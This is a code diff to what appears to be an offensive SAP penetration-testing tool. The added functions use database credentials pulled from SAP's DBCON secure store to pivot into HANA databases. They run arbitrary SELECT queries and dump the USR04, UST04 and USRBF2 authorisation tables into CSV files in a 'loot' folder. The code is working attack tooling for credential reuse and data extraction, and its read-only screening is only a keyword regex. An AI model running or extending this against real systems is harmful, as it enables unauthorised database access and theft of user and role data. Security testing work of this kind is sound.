@@ -437,7 +437,8 @@ def integrate_dbcon_from_secstore(node: SAPNode, state: SAPMAPState,
                     f"{e.user}@{e.host}:{e.port} — credentials "
                     f"available for direct-DB pivot",
                     ref="dbcon.resolved",
-                    meta={"con_name": e.con_name, "dbms": e.dbms})
+                    meta={"con_name": e.con_name, "dbms": e.dbms},
+                    attack_capability="recon.dbcon_resolve")
         except Exception:
             pass
     return added
@@ -915,13 +916,28 @@ def enumerate_hana_tables(edge: DBCONConnection, limit: int = 200) -> dict:
 _HANA_IDENT_RE = _re.compile(r"^[A-Za-z_][A-Za-z0-9_$#]*$")
 
 
+_SQL_WRITE_RE = _re.compile(
+    r"\b(INSERT|UPDATE|DELETE|DROP|TRUNCATE|ALTER|CREATE|GRANT|"
+    r"REVOKE|MERGE|CALL|EXEC|EXECUTE|REPLACE|RENAME|COMMIT|"
+    r"ROLLBACK|SAVEPOINT|BACKUP|SET|SETUSER|IMPORT|EXPORT)\b",
+    _re.IGNORECASE)
+
+
 def peek_hana_table(edge: DBCONConnection, schema: str, table: str,
-                      limit: int = 10) -> dict:
+                      limit: int = 10, where: str = "") -> dict:
     """SELECT the first `limit` rows from schema.table via the DBCON.
 
     Whitelists identifiers against HANA's naming rules — SQL
     injection defence for the schema/table strings that come from
     the operator's ctx-menu click on an enumerated row.
+
+    `where` is an optional filter clause — bare (WITHOUT the leading
+    'WHERE' keyword) — passed straight through as-is.  The identifier
+    whitelist already covers schema/table; WHERE injection is the
+    operator's own footgun (they can only reach it via authenticated
+    typed input), but we DO screen it for INSERT/UPDATE/DELETE/etc.
+    write-family keywords so a stray semicolon can't turn a peek
+    into a mutation.
 
     Returns {ok, error, columns: [str], rows: [[val, ...]], truncated}.
     """
@@ -953,7 +969,19 @@ def peek_hana_table(edge: DBCONConnection, schema: str, table: str,
     if edge.dbname: kwargs["databaseName"] = edge.dbname
 
     limit = max(1, min(int(limit), 500))
-    sql = f'SELECT * FROM "{schema}"."{table}" LIMIT {limit}'
+    where = (where or "").strip()
+    if where:
+        if _SQL_WRITE_RE.search(where):
+            out["error"] = ("WHERE clause contains write-family "
+                             "keyword — blocked to prevent mutation")
+            return out
+        # Strip a leading WHERE if operator included it (harmless UX)
+        if where.upper().startswith("WHERE "):
+            where = where[6:].strip()
+        sql = (f'SELECT * FROM "{schema}"."{table}" '
+                f'WHERE {where} LIMIT {limit}')
+    else:
+        sql = f'SELECT * FROM "{schema}"."{table}" LIMIT {limit}'
     print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — peek: {sql}")
     conn = None
     try:
@@ -1414,3 +1442,214 @@ def materialize_target_as_sap_node(edge: DBCONConnection,
               f"failed for {target_sid}: {type(e).__name__}: {e}")
         return None
     return node
+
+
+# ============================================================================
+# Custom read-only SQL — arbitrary SELECT with write-family block
+# ============================================================================
+
+def custom_sql_query(edge: DBCONConnection, sql: str,
+                      limit: int = 200) -> dict:
+    """Run an operator-supplied SELECT against the DBCON target.
+
+    Rejects anything matching the write-family keyword regex to keep
+    the abstraction "read-only".  Also caps the result set at `limit`
+    rows on the client side so a runaway SELECT * doesn't blow the
+    browser.  Returns the same shape as peek_hana_table for reuse of
+    the overlay renderer.
+    """
+    out = {"ok": False, "error": "", "columns": [], "rows": [],
+           "truncated": False, "sql": sql}
+    sql = (sql or "").strip().rstrip(";")
+    if not sql:
+        out["error"] = "empty SQL"
+        return out
+    if not sql.upper().lstrip("(").startswith("SELECT"):
+        out["error"] = ("only SELECT statements allowed — the DBCON "
+                         "custom-SQL box is read-only")
+        return out
+    if _SQL_WRITE_RE.search(sql):
+        out["error"] = ("SQL contains write-family keyword — blocked "
+                         "to preserve read-only guarantee")
+        return out
+    if edge.dbms != "HDB":
+        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
+        return out
+    if not edge.reachable:
+        out["error"] = "edge not reachable"
+        return out
+
+    dbapi, err = _import_hdbcli()
+    if dbapi is None:
+        out["error"] = err
+        return out
+
+    kwargs = {
+        "address": edge.host, "port": edge.port,
+        "user": edge.user, "password": edge.password,
+        "autocommit": True, "communicationTimeout": 60000,
+    }
+    if edge.dbname: kwargs["databaseName"] = edge.dbname
+
+    limit = max(1, min(int(limit), 5000))
+    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — custom SQL "
+          f"(limit={limit}): {sql[:200]}")
+    conn = None
+    try:
+        conn = dbapi.connect(**kwargs)
+        cur = conn.cursor()
+        try:
+            cur.execute(sql)
+            out["columns"] = [d[0] for d in (cur.description or [])]
+            def _cell(v):
+                if v is None: return None
+                if isinstance(v, memoryview):
+                    return v.tobytes().hex().upper()
+                if isinstance(v, (bytes, bytearray)):
+                    return bytes(v).hex().upper()
+                if hasattr(v, "isoformat"): return v.isoformat()
+                return str(v)
+            rowct = 0
+            for r in cur:
+                if rowct >= limit:
+                    out["truncated"] = True
+                    break
+                out["rows"].append([_cell(v) for v in r])
+                rowct += 1
+            out["ok"] = True
+        finally:
+            cur.close()
+        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"custom SQL returned {len(out['rows'])} row(s)"
+              + (" (truncated)" if out["truncated"] else ""))
+    except Exception as e:
+        code = _hana_error_code(e)
+        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
+        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"custom SQL failed: {out['error']}")
+    finally:
+        try:
+            if conn is not None: conn.close()
+        except Exception: pass
+    return out
+
+
+# ============================================================================
+# USR04 / UST04 / USRBF2 auth-object dump
+# ============================================================================
+
+def dump_auth_tables(edge: DBCONConnection,
+                       source_node: SAPNode = None,
+                       loot_dir: str = "") -> dict:
+    """Extract profile / role / auth-buffer tables for offline
+    "who can do what" analysis.
+
+    USR04  — profile assignments (BNAME → PROFS[10] pack)
+    UST04  — user↔profile join
+    USRBF2 — authorisation buffer (per-user compiled S_TCODE etc.)
+
+    Writes three CSVs to loot/dbcon/auth_<SID>_<con>_<ts>/.
+    Returns {ok, error, files: {usr04, ust04, usrbf2}, counts}.
+    """
+    import os as _os
+    from datetime import datetime as _dt
+    out = {"ok": False, "error": "",
+           "files": {"usr04": "", "ust04": "", "usrbf2": ""},
+           "counts": {"usr04": 0, "ust04": 0, "usrbf2": 0}}
+    if edge.dbms != "HDB":
+        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
+        return out
+    if not (edge.reachable and edge.is_sap_shape):
+        out["error"] = ("edge must be SAP-shape reachable — auth-table "
+                         "dump needs the ABAP dictionary present")
+        return out
+
+    dbapi, err = _import_hdbcli()
+    if dbapi is None:
+        out["error"] = err
+        return out
+
+    kwargs = {
+        "address": edge.host, "port": edge.port,
+        "user": edge.user, "password": edge.password,
+        "autocommit": True, "communicationTimeout": 60000,
+    }
+    if edge.dbname: kwargs["databaseName"] = edge.dbname
+
+    conn = None
+    try:
+        conn = dbapi.connect(**kwargs)
+        schema = _resolve_sap_schema(conn, target_sid=edge.target_sid)
+        if not schema:
+            out["error"] = ("could not locate USR02 in any known SAP "
+                             "schema — same resolver as USR02 dump")
+            return out
+        print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"dumping USR04/UST04/USRBF2 from {schema} on {edge.host}")
+
+        if not loot_dir:
+            loot_dir = _os.path.join(_os.getcwd(), "loot", "dbcon")
+        _os.makedirs(loot_dir, exist_ok=True)
+        ts = _dt.utcnow().strftime("%Y%m%d_%H%M%S")
+        sid = (edge.target_sid or edge.con_name).upper()
+        sub = _os.path.join(
+            loot_dir, f"auth_{sid}_{edge.con_name}_{ts}")
+        _os.makedirs(sub, exist_ok=True)
+
+        import csv as _csv
+        for tbl, cols in (
+            ("USR04",  "MANDT,BNAME,PROFS,MOD,BAS,CHANGE,ACTIVE"),
+            ("UST04",  "MANDT,BNAME,PROFILE"),
+            ("USRBF2", "MANDT,BNAME,OBJCT,AUTH,FIELD,VON,BIS,MODDA,MODBE"),
+        ):
+            key = tbl.lower()
+            path = _os.path.join(sub, f"{key}.csv")
+            cur = conn.cursor()
+            try:
+                cur.execute(
+                    f'SELECT {cols} FROM "{schema}"."{tbl}" '
+                    f'ORDER BY BNAME')
+                colnames = [d[0] for d in (cur.description or [])]
+                with open(path, "w", newline="") as fh:
+                    w = _csv.writer(fh)
+                    w.writerow(colnames)
+                    n = 0
+                    for r in cur:
+                        def _cell(v):
+                            if v is None: return ""
+                            if isinstance(v, (bytes, bytearray, memoryview)):
+                                return bytes(v).hex().upper()
+                            return str(v)
+                        w.writerow([_cell(v) for v in r])
+                        n += 1
+                out["counts"][key] = n
+                out["files"][key] = path
+                try: _os.chmod(path, 0o600)
+                except Exception: pass
+                print(f"    [+] {tbl}: {n} row(s) → {path}")
+            except Exception as _te:
+                code = _hana_error_code(_te)
+                print(f"    [-] {tbl}: HANA {code or '?'} — "
+                      f"{str(_te)[:120]}")
+            finally:
+                cur.close()
+
+        # Verdict: at least USR04 has to come back to call it a win
+        if out["counts"]["usr04"] == 0 and out["counts"]["ust04"] == 0:
+            out["error"] = ("all auth tables returned 0 rows / raised — "
+                             "check permissions on USR04/UST04/USRBF2")
+            return out
+        out["ok"] = True
+        total = sum(out["counts"].values())
+        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — auth "
+              f"dump: {total} row(s) across USR04/UST04/USRBF2 → {sub}")
+    except Exception as e:
+        code = _hana_error_code(e)
+        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
+        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"auth dump failed: {out['error']}")
+    finally:
+        try:
+            if conn is not None: conn.close()
+        except Exception: pass
+    return out
